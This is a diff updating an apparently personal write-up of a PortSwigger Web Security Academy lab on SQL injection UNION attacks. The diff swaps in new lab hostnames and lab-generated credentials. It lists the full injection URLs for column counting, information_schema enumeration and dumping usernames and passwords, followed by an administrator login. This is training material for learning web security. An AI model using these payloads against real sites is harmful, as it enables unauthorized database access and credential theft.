@@ -202,17 +202,17 @@ The steps used to perform can be reached below (sequence).
 To solve the lab, perform a SQL injection UNION attack that <b>retrieves all usernames and passwords</b>, and use the information to <b>log in as the administrator user</b>.
 
 The steps used to perform can be reached below (sequence).
-1. https://0ac400fd043dbea29fe43836004b005a.web-security-academy.net/
-2. https://0ac400fd043dbea29fe43836004b005a.web-security-academy.net/filter?category=Gifts.
-3. https://0ac400fd043dbea29fe43836004b005a.web-security-academy.net/filter?category=%27order%20by%203--.
-4. Since the 3 column shows internal server error, then it should be 2 column. (https://0ac400fd043dbea29fe43836004b005a.web-security-academy.net/filter?category=%27order%20by%202--).
-5. Then we can try to perform injection to get all tables on the schema using <code>'union select table_name,null from information_schema.tables--</code> (https://0ac400fd043dbea29fe43836004b005a.web-security-academy.net/filter?category=%27union%20select%20table_name,null%20from%20information_schema.tables--), then try to find user table, and there are few of table named "users".
-6. Try to use <code>'union select column_name,null from information_schema.columns where table_name='users'--</code> to show all the columns on "users" table. (https://0ac400fd043dbea29fe43836004b005a.web-security-academy.net/filter?category=%27union%20select%20column_name,null%20from%20information_schema.columns%20where%20table_name=%27users%27--).
+1. https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/
+2. https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/filter?category=Gifts.
+3. https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/filter?category=%27order%20by%203--.
+4. Since the 3 column shows internal server error, then it should be 2 column. (https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/filter?category=%27order%20by%202--).
+5. Then we can try to perform injection to get all tables on the schema using <code>'union select table_name,null from information_schema.tables--</code> (https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/filter?category=%27union%20select%20table_name,null%20from%20information_schema.tables--), then try to find user table, and there are few of table named "users".
+6. Try to use <code>'union select column_name,null from information_schema.columns where table_name='users'--</code> to show all the columns on "users" table. (https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/filter?category=%27union%20select%20column_name,null%20from%20information_schema.columns%20where%20table_name=%27users%27--).
 7. After we got the columns name on "users" table, then we just show all rows there using <code>'union select username,password from users--</code>
-  &nbsp;&nbsp;&nbsp;1. <code>administrator, xmosnctzn2wen3y6a8cm</code>
-  &nbsp;&nbsp;&nbsp;2. carlos, ylmjqi6naytp754av1ye
-  &nbsp;&nbsp;&nbsp;3. wiener, cnff07l8478noxmmsai4
-Since we've got the administrator password, we just have to log in by admin account (https://0ac400fd043dbea29fe43836004b005a.web-security-academy.net/my-account?id=administrator).
+  &nbsp;&nbsp;&nbsp;1. <code>administrator, eb9qebphwfporp5ahk34</code>
+  &nbsp;&nbsp;&nbsp;2. carlos, bgzcijedaxa3tbsd7bha
+  &nbsp;&nbsp;&nbsp;3. wiener, ixeybzs4yktiu3yosav1
+Since we've got the administrator password, we just have to log in by admin account (https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/my-account?id=administrator).
 
 <br></br>
 
